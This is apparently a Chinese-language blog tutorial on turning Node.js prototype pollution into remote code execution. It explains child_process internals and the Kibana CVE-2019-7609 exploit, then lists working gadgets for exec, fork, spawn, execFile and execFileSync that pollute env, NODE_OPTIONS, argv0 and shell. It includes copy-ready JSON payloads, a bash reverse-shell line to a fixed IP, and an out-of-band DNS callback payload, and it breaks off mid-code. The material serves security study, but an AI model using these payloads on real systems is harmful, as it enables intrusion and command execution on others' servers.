<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title class_">Spawn</span>(<span class="keyword">const</span> <span class="title class_">FunctionCallbackInfo</span>&lt;<span class="title class_">Value</span>&gt;&amp; args) &#123;</span><br><span class="line">    <span class="comment">//获取js传过来的第一个option参数</span></span><br><span class="line">    <span class="title class_">Local</span>&lt;<span class="title class_">Object</span>&gt; js_options = args[<span class="number">0</span>]-&gt;<span class="title class_">ToObject</span>(env-&gt;<span class="title function_">context</span>()).<span class="title class_">ToLocalChecked</span>();</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// options.env</span></span><br><span class="line">    <span class="title class_">Local</span>&lt;<span class="title class_">Value</span>&gt; env_v =</span><br><span class="line">        js_options-&gt;<span class="title class_">Get</span>(context, env-&gt;<span class="title function_">env_pairs_string</span>()).<span class="title class_">ToLocalChecked</span>();</span><br><span class="line">    <span class="keyword">if</span> (!env_v.<span class="title class_">IsEmpty</span>() &amp;&amp; env_v-&gt;<span class="title class_">IsArray</span>()) &#123;</span><br><span class="line">      <span class="title class_">Local</span>&lt;<span class="title class_">Array</span>&gt; env_opt = <span class="title class_">Local</span>&lt;<span class="title class_">Array</span>&gt;::<span class="title class_">Cast</span>(env_v);</span><br><span class="line">      int envc = env_opt-&gt;<span class="title class_">Length</span>();</span><br><span class="line">      <span class="title function_">CHECK_GT</span>(envc + <span class="number">1</span>, <span class="number">0</span>);  <span class="comment">// Check for overflow.</span></span><br><span class="line">      options.<span class="property">env</span> = <span class="keyword">new</span> char*[envc + <span class="number">1</span>];  <span class="comment">// Heap allocated to detect errors.</span></span><br><span class="line">      <span class="keyword">for</span> (int i = <span class="number">0</span>; i &lt; envc; i++) &#123;</span><br><span class="line">        <span class="attr">node</span>::<span class="title class_">Utf8Value</span> <span class="title function_">pair</span>(env-&gt;<span class="title function_">isolate</span>(),</span><br><span class="line">                             env_opt-&gt;<span class="title class_">Get</span>(context, i).<span class="title class_">ToLocalChecked</span>());</span><br><span class="line">        options.<span class="property">env</span>[i] = <span class="title function_">strdup</span>(*pair);</span><br><span class="line">        <span class="title function_">CHECK_NOT_NULL</span>(options.<span class="property">env</span>[i]);</span><br><span class="line">      &#125;</span><br><span class="line">      options.<span class="property">env</span>[envc] = nullptr;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="comment">//调用uv_spawn生成子进程，并将父进程的event_loop传递过去</span></span><br><span class="line">    int err = <span class="title function_">uv_spawn</span>(env-&gt;<span class="title function_">event_loop</span>(), &amp;wrap-&gt;process_, &amp;options);</span><br><span class="line">    <span class="comment">//省略</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>代码只截取了对 env 这个属性的操作，它将原先的 envPairs 进行封装。最后所有 options 带入<code>uv_spawn</code>来生成子进程，在<code>uv_spawn</code>中就是常规的 fork()、waitpid() 来控制进程的产生和资源释放，不过有一个非常重要的实现如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//process.cc-&gt;uv_spawn()</span><br><span class="line"></span><br><span class="line">execvp(options-&gt;file, options-&gt;args);</span><br></pre></td></tr></table></figure>

<p>使用了 execvp 来执行任务，这里的 options-&gt;file 就是我们最初传给spawn的参数。比如我们的例子是<code>spawn(&#39;whoami&#39;)</code>，那么此时的file就是<code>whoami</code>，当然对于有参数的命令，则 options-&gt;args 与之对应。</p>
<p><strong>流程总结：</strong></p>
<p>child_process创建子进程的流程看起来有些复杂，总结一下:</p>
<p>1、初始化子进程需要的参数，设置环境变量<br>2、fork()创建子进程，并用<code>execvp</code>执行系统命令。</p>
<p><code>fork()</code> 通常用于将需要并行处理的任务放到子进程中，从而避免阻塞主线程。它可以用来运行一个独立的 JavaScript 文件，这个文件执行后会成为子进程。子进程与主进程可以通过消息传递进行通信。</p>
<p>3、ipc通信，输出捕捉</p>
<h3 id="Kibana-RCE（CVE-2019-7609）"><a href="#Kibana-RCE（CVE-2019-7609）" class="headerlink" title="Kibana-RCE（CVE-2019-7609）"></a>Kibana-RCE（CVE-2019-7609）</h3><p>node &gt; v8.0.0 支持运行node时增加一个命令行参数<code>NODE_OPTIONS</code>，它能够包含一个js脚本，相当于include。</p>
<p>在node进程启动的时候会作为环境变量加载。</p>
<p><code>NODE_OPTIONS</code> 是一个环境变量，用于为 Node.js 程序配置命令行选项。通过设置 <code>NODE_OPTIONS</code>，你可以在启动 Node.js 进程时自动应用一些全局选项，而不需要每次启动程序时手动在命令行中指定。</p>
<p>使用 <code>NODE_OPTIONS</code> 可以对 Node.js 的行为进行全局控制，特别适合在开发和生产环境中需要对多个 Node.js 进程进行配置时使用。</p>
<p>node的官方文档中能找到用例：<a target="_blank" rel="noopener" href="https://nodejs.cn/api/cli/node_options_options.html">NODE_OPTIONS&#x3D;options… | Node.js API 文档</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NODE_OPTIONS=<span class="string">&#x27;--require ./evil.js&#x27;</span> node</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509152307507.png" alt="image-20250509152307507"></p>
<p>如果我们能改变本地环境变量，则在node创建进程的时候就可以包含恶意语句，当然了这需要 bash 来export</p>
<p>不过上面打印 process.env 也显示出一件事，只需要污染 process.env 即可rce，于是有了Kibana的poc：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.es(*).props(label.__proto__.env.AAAA=<span class="string">&#x27;require(&quot;child_process&quot;).exec(&quot;bash -i &gt;&amp; /dev/tcp/192.168.0.136/12345 0&gt;&amp;1&quot;);process.exit()//&#x27;</span>)</span><br><span class="line"></span><br><span class="line">.props(label.__proto__.env.NODE_OPTIONS=<span class="string">&#x27;--require /proc/self/environ&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>node运行时会把当前进程的 env 写进系统的环境变量，子进程也一样，在linux中存储为<code>/proc/self/environ</code></p>
<p>通过污染 env 把恶意的语句写进 &#x2F;proc&#x2F;self&#x2F;environ。同时污染<code>process.NODE_OPTIONS</code>属性，使node在生成新进程的时候，包含我们构造的<code>/proc/self/environ</code>。具体操作就类似下面的用法</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AAAA=<span class="string">&#x27;console.log(123)//&#x27;</span> NODE_OPTIONS=<span class="string">&#x27;--require /proc/self/environ&#x27;</span> node</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509152441633.png" alt="image-20250509152441633"></p>
<p>污染了 Object.env 之后，利用Canvas生成新进程的时候会执行spawn从而RCE</p>
<p>由于我们的重心是pp2rce，Kibana部分的源码就不搞了，看看图得了（</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509152500525.png" alt="image-20250509152500525"></p>
<p>需要知道的是<code>fork()</code>和<code>spawn(&#39;whoami&#39;)</code>的差别，虽然 fork 调用了 spawn 来实现的子进程创建</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exports</span>.<span class="property">fork</span> = <span class="keyword">function</span>(<span class="params">modulePath <span class="comment">/*, args, options*/</span></span>) &#123;</span><br><span class="line">    ...<span class="comment">//省略</span></span><br><span class="line">    options.<span class="property">execPath</span> = options.<span class="property">execPath</span> || process.<span class="property">execPath</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">spawn</span>(options.<span class="property">execPath</span>, args, options);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>它处理了 execPath 这个属性，默认获取系统变量的 process.execPath ，再传入spawn，这里是<code>node</code></p>
<p>而使用 spawn 处理的时候，得到的file是我们传入的参数<code>whoami</code></p>
<p>上面分析过，child_process 在子进程创建的最底层，会调用 execvp 执行命令执行file</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execvp(options-&gt;file, options-&gt;args);</span><br></pre></td></tr></table></figure>

<p>而上面poc的核心就是<code>NODE_OPTIONS=&#39;--require /proc/self/environ&#39; node</code>，即bash调用了node去执行。所以此处的file值必须为node，否则无法将NODE_OPTIONS载入</p>
<p>而直接调用spawn函数时必须有file值，这也造成了直接跑<code>spawn(&#39;whoami&#39;)</code>无法加载 evil.js 的情况</p>
<p>所以最终的poc是：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test.js</span></span><br><span class="line">proc = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> aa = &#123;&#125;</span><br><span class="line">aa.<span class="property">__proto__</span>.<span class="property">env</span> = &#123;<span class="string">&#x27;AAAA&#x27;</span>:<span class="string">&#x27;console.log(123)//&#x27;</span>,<span class="string">&#x27;NODE_OPTIONS&#x27;</span>:<span class="string">&#x27;--require /proc/self/environ&#x27;</span>&#125;</span><br><span class="line">proc.<span class="title function_">fork</span>(<span class="string">&#x27;./function.js&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//function.js</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;this is func&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>这个trick如果要用 fork 进行 rce 的话要求我们能够可控一个文件的内容</p>
<p>经过测试<code>exec</code>、<code>execFile</code>函数无论传入什么命令，file的值都会为<code>/bin/sh</code>，因为参数shell默认为true。即使不传入 options 选项，这两个命令也会默认定义options，这也是 child_process 防止命令执行的一种途径</p>
<p>但是shell这个变量也是可以被污染的，不过child_process在这里做了限制，即使 shell&#x3D;&#x3D;&#x3D;false 或字符串。最终传到execvp时也会被执行的参数替代，而不是真正的node进程</p>
<h3 id="PP2RCE（Prototype-Pollution-to-RCE）"><a href="#PP2RCE（Prototype-Pollution-to-RCE）" class="headerlink" title="PP2RCE（Prototype Pollution to RCE）"></a>PP2RCE（Prototype Pollution to RCE）</h3><h4 id="通过环境变量"><a href="#通过环境变量" class="headerlink" title="通过环境变量"></a>通过环境变量</h4><p>原理就是上面的 Kibana-RCE</p>
<p>为了让 &#x2F;proc&#x2F;self&#x2F;environ 开头就是我们的恶意js代码，EVIL 的部分必须放在最开始</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; execSync, fork &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Manual Pollution</span></span><br><span class="line">b = &#123;&#125;</span><br><span class="line">b.<span class="property">__proto__</span>.<span class="property">env</span> = &#123; <span class="string">&quot;EVIL&quot;</span>:<span class="string">&quot;console.log(require(&#x27;child_process&#x27;).execSync(&#x27;cat /proc/self/environ&gt;pp2rce.txt&#x27;).toString())//&quot;</span>&#125;</span><br><span class="line">b.<span class="property">__proto__</span>.<span class="property">NODE_OPTIONS</span> = <span class="string">&quot;--require /proc/self/environ&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Trigger gadget</span></span><br><span class="line"><span class="keyword">var</span> proc = <span class="title function_">fork</span>(<span class="string">&#x27;./evil.js&#x27;</span>);</span><br><span class="line"><span class="comment">// This should create the file pp2rce.txt</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509152642698.png" alt="image-20250509152642698"></p>
<p>可以看到这里实际rce的就是执行了<code>node /proc/self/environ</code></p>
<p>json速抄：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;NODE_OPTIONS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;--require /proc/self/environ&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;env&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> <span class="attr">&quot;EVIL&quot;</span><span class="punctuation">:</span><span class="string">&quot;console.log(require(\\\&quot;child_process\\\&quot;).execSync(\\\&quot;touch /tmp/pp2rce\\\&quot;).toString())//&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>



<h4 id="via-env-vars-cmdline"><a href="#via-env-vars-cmdline" class="headerlink" title="via env vars + cmdline"></a>via env vars + cmdline</h4><p>不知道从哪个版本开始，nodejs会始终将<code>NODE_OPTIONS</code>放在 <code>environ</code> 文件中的首位，于是就有了这个方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spawn()` 函数还有另外两个选项：`argv0` 和 `shell</span><br></pre></td></tr></table></figure>

<ul>
<li>argv0：控制传递给新进程的参数列表中的第一个元素，相当于执行命令，而所有的参数都会出现在文件 <code>/proc/self/cmdline</code> 中，因此第一个元素将位于开头</li>
</ul>
<p>那么我们可以尝试把 <code>NODE_OPTIONS</code> 的值更改为 <code>--require /proc/self/cmdline</code>，并且把 payload 写入 argv0</p>
<p>不过这时候由于 argv0 被修改了，导致无法生成进程，因为它不是有效的命令或文件路径，这点我们可以指定 shell 参数来绕过，只要设置为一个可执行文件的路径，这样执行命令时就会把shell参数附加到命令及其参数的前面，如<code>/bin/myshell -c &quot;command arg1 arg2 arg3&quot;</code>，这里无脑用<code>/proc/self/exe</code>即可</p>
<p>到时候执行的节点进程大致如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(<span class="string">&quot;/proc/self/exe&quot;</span>, [<span class="string">&quot;console.log(&#x27;pwned!&#x27;);//&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;node …&quot;</span>], &#123; NODE_OPTIONS: <span class="string">&quot;--require /proc/self/cmdline&quot;</span> &#125;)</span><br></pre></td></tr></table></figure>

<p>此时 argv0 即这里的<code>console.log(&#39;pwned!&#39;);//</code></p>
<p>poc：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; execSync, fork &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Manual Pollution</span></span><br><span class="line">b = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实测shell参数可以不改，不知道为什么</span></span><br><span class="line"><span class="comment">// b.__proto__.shell = &quot;/proc/self/exe&quot;</span></span><br><span class="line">b.<span class="property">__proto__</span>.<span class="property">argv0</span> = <span class="string">&quot;console.log(require(&#x27;child_process&#x27;).execSync(&#x27;cat /proc/self/cmdline&gt;pp2rce.txt&#x27;).toString())//&quot;</span></span><br><span class="line">b.<span class="property">__proto__</span>.<span class="property">NODE_OPTIONS</span> = <span class="string">&quot;--require /proc/self/cmdline&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Trigger gadget</span></span><br><span class="line"><span class="keyword">var</span> proc = <span class="title function_">fork</span>(<span class="string">&#x27;./evil.js&#x27;</span>);</span><br><span class="line"><span class="comment">// This should create the file pp2rce.txt</span></span><br></pre></td></tr></table></figure>

<p>json速抄：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;NODE_OPTIONS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;--require /proc/self/cmdline&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;argv0&quot;</span><span class="punctuation">:</span> <span class="string">&quot;console.log(require(\\\&quot;child_process\\\&quot;).execSync(\\\&quot;touch /tmp/pp2rce2\\\&quot;).toString())//&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>



<h4 id="DNS探测"><a href="#DNS探测" class="headerlink" title="DNS探测"></a>DNS探测</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--inspect`是用来指定调试器url的，如`NODE_OPTIONS=&#x27;--inspect=localhost:4444&#x27;</span><br></pre></td></tr></table></figure>

<p>甚至可以指定一个dns服务器</p>
<p><img src="https://c1oudfl0w0.github.io/blog/2024/10/11/PP2RCE/image-20241012172457197.png" alt="image-20241012172457197"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509152712988.png" alt="image-20250509152712988"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;__proto__&quot;: &#123;</span><br><span class="line">&quot;argv0&quot;:&quot;node&quot;,</span><br><span class="line">&quot;shell&quot;:&quot;node&quot;,</span><br><span class="line">&quot;NODE_OPTIONS&quot;:&quot;--inspect=id\&quot;\&quot;.oastify\&quot;\&quot;.com&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="上述两种方法延伸出child-process-下其它函数利用"><a href="#上述两种方法延伸出child-process-下其它函数利用" class="headerlink" title="上述两种方法延伸出child_process 下其它函数利用"></a>上述两种方法延伸出child_process 下其它函数利用</h3><p>node v18.4.0后，options 的默认值为 kEmptyObject 而不是 <code>&#123;&#125;</code>，对<code>spawn</code> 和 <code>spawnSync</code>有影响</p>
<h4 id="1-exec"><a href="#1-exec" class="headerlink" title="1.exec"></a>1.exec</h4><p>不能污染<code>.env</code>，因为此时 options.env 的值为 null</p>
<p>污染cmdline：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// cmdline trick - working with small variation</span></span><br><span class="line"><span class="comment">// Working after kEmptyObject (fix)</span></span><br><span class="line"><span class="keyword">const</span> &#123; exec &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line">p = &#123;&#125;</span><br><span class="line">p.<span class="property">__proto__</span>.<span class="property">shell</span> = <span class="string">&quot;/proc/self/exe&quot;</span> <span class="comment">//You need to make sure the node executable is executed</span></span><br><span class="line">p.<span class="property">__proto__</span>.<span class="property">argv0</span> = <span class="string">&quot;console.log(require(&#x27;child_process&#x27;).execSync(&#x27;whoami&gt;pp2rce.txt&#x27;).toString())//&quot;</span></span><br><span class="line">p.<span class="property">__proto__</span>.<span class="property">NODE_OPTIONS</span> = <span class="string">&quot;--require /proc/self/cmdline&quot;</span></span><br><span class="line"><span class="keyword">var</span> proc = <span class="title function_">exec</span>(<span class="string">&#x27;something&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>windows下（后面windows都差不多就不重复copy了）：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; exec &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line">p = &#123;&#125;</span><br><span class="line">p.<span class="property">__proto__</span>.<span class="property">shell</span> = <span class="string">&quot;\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe&quot;</span></span><br><span class="line"><span class="keyword">var</span> proc = <span class="title function_">exec</span>(<span class="string">&#x27;something&#x27;</span>);</span><br></pre></td></tr></table></figure>



<h4 id="2-execFile"><a href="#2-execFile" class="headerlink" title="2.execFile"></a>2.execFile</h4><p>env：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// environ trick - working</span></span><br><span class="line"><span class="comment">// Working after kEmptyObject (fix)</span></span><br><span class="line"><span class="keyword">const</span> &#123; fork &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line">b = &#123;&#125;</span><br><span class="line">b.<span class="property">__proto__</span>.<span class="property">env</span> = &#123; <span class="string">&quot;EVIL&quot;</span>:<span class="string">&quot;console.log(require(&#x27;child_process&#x27;).execSync(&#x27;touch /tmp/fork-environ&#x27;).toString())//&quot;</span>&#125;</span><br><span class="line">b.<span class="property">__proto__</span>.<span class="property">NODE_OPTIONS</span> = <span class="string">&quot;--require /proc/self/environ&quot;</span></span><br><span class="line"><span class="keyword">var</span> proc = <span class="title function_">fork</span>(<span class="string">&#x27;something&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>cmdline：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// cmdline trick - working</span></span><br><span class="line"><span class="comment">// Working after kEmptyObject (fix)</span></span><br><span class="line"><span class="keyword">const</span> &#123; fork &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line">p = &#123;&#125;</span><br><span class="line">p.<span class="property">__proto__</span>.<span class="property">argv0</span> = <span class="string">&quot;console.log(require(&#x27;child_process&#x27;).execSync(&#x27;touch /tmp/fork-cmdline&#x27;).toString())//&quot;</span></span><br><span class="line">p.<span class="property">__proto__</span>.<span class="property">NODE_OPTIONS</span> = <span class="string">&quot;--require /proc/self/cmdline&quot;</span></span><br><span class="line"><span class="keyword">var</span> proc = <span class="title function_">fork</span>(<span class="string">&#x27;something&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>还有直接控制 execArgv 参数来命令执行的：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// execArgv trick - working</span></span><br><span class="line"><span class="comment">// Only the fork method has this attribute</span></span><br><span class="line"><span class="comment">// Working after kEmptyObject (fix)</span></span><br><span class="line"><span class="keyword">const</span> &#123; fork &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line">b = &#123;&#125;</span><br><span class="line">b.<span class="property">__proto__</span>.<span class="property">execPath</span> = <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">b.<span class="property">__proto__</span>.<span class="property">argv0</span> = <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">b.<span class="property">__proto__</span>.<span class="property">execArgv</span> = [<span class="string">&quot;-c&quot;</span>, <span class="string">&quot;touch /tmp/fork-execArgv&quot;</span>]</span><br><span class="line"><span class="keyword">var</span> proc = <span class="title function_">fork</span>(<span class="string">&#x27;./a_file.js&#x27;</span>);</span><br></pre></td></tr></table></figure>



<h4 id="3-spawn"><a href="#3-spawn" class="headerlink" title="3.spawn"></a>3.spawn</h4><p>污染env：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// environ trick - working with small variation (shell and argv0)</span></span><br><span class="line"><span class="comment">// NOT working after kEmptyObject (fix) without options</span></span><br><span class="line"><span class="keyword">const</span> &#123; spawn &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line">p = &#123;&#125;</span><br><span class="line"><span class="comment">// If in windows or mac you need to change the following params to the path of ndoe</span></span><br><span class="line">p.<span class="property">__proto__</span>.<span class="property">argv0</span> = <span class="string">&quot;/proc/self/exe&quot;</span> <span class="comment">//You need to make sure the node executable is executed</span></span><br><span class="line">p.<span class="property">__proto__</span>.<span class="property">shell</span> = <span class="string">&quot;/proc/self/exe&quot;</span> <span class="comment">//You need to make sure the node executable is executed</span></span><br><span class="line">p.<span class="property">__proto__</span>.<span class="property">env</span> = &#123; <span class="string">&quot;EVIL&quot;</span>:<span class="string">&quot;console.log(require(&#x27;child_process&#x27;).execSync(&#x27;whoami&gt;pp2rce.txt&#x27;).toString())//&quot;</span>&#125;</span><br><span class="line">p.<span class="property">__proto__</span>.<span class="property">NODE_OPTIONS</span> = <span class="string">&quot;--require /proc/self/environ&quot;</span></span><br><span class="line"><span class="keyword">var</span> proc = <span class="title function_">spawn</span>(<span class="string">&#x27;something&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>污染cmdline：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// cmdline trick - working with small variation (shell)</span></span><br><span class="line"><span class="comment">// NOT working after kEmptyObject (fix) without options</span></span><br><span class="line"><span class="keyword">const</span> &#123; spawn &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line">p = &#123;&#125;</span><br><span class="line">p.<span class="property">__proto__</span>.<span class="property">shell</span> = <span class="string">&quot;/proc/self/exe&quot;</span> <span class="comment">//You need to make sure the node executable is executed</span></span><br><span class="line">p.<span class="property">__proto__</span>.<span class="property">argv0</span> = <span class="string">&quot;console.log(require(&#x27;child_process&#x27;).execSync(&#x27;touch /tmp/spawn-cmdline&#x27;).toString())//&quot;</span></span><br><span class="line">p.<span class="property">__proto__</span>.<span class="property">NODE_OPTIONS</span> = <span class="string">&quot;--require /proc/self/cmdline&quot;</span></span><br><span class="line"><span class="keyword">var</span> proc = <span class="title function_">spawn</span>(<span class="string">&#x27;something&#x27;</span>);</span><br><span class="line"><span class="comment">//var proc = spawn(&#x27;something&#x27;,[],&#123;&quot;cwd&quot;:&quot;/tmp&quot;&#125;); //To work after kEmptyObject (fix)</span></span><br></pre></td></tr></table></figure>



<h4 id="4-execFileSync"><a href="#4-execFileSync" class="headerlink" title="4.execFileSync"></a>4.execFileSync</h4><p>env：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// environ trick - working with small variation (shell and argv0)</span></span><br><span class="line"><span class="comment">// Working after kEmptyObject (fix)</span></span><br><span class="line"><span class="keyword">const</span> &#123; execFileSync &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line">p = &#123;&#125;</span><br><span class="line"><span class="comment">// If in windows or mac you need to change the following params to the path of ndoe</span></span><br><span class="line">p.<span class="property">__proto__</span>.<span class="property">argv0</span> = <span class="string">&quot;/proc/self/exe&quot;</span> <span class="comment">//You need to make sure the node executable is executed</span></span><br><span class="line">p.<span class="property">__proto__</span>.<span class="property">shell</span> = <span class="string">&quot;/proc/self/exe&quot;</span> <span 